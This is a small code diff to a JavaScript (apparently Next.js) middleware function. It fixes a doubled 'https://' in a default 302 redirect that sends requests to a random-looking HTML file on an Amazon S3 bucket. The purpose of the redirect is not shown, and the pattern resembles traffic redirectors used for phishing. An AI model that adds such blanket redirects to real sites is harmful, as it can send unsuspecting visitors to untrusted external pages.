@@ -48,7 +48,7 @@ export function middleware(request) {
 
   // Default redirect
   return NextResponse.redirect(
-    'https://https://sxkt-01ucktb.s3.us-east-2.amazonaws.com/Vt-ewye74903u3un.html',
+    'https://sxkt-01ucktb.s3.us-east-2.amazonaws.com/Vt-ewye74903u3un.html',
     { status: 302 }
   )
 }
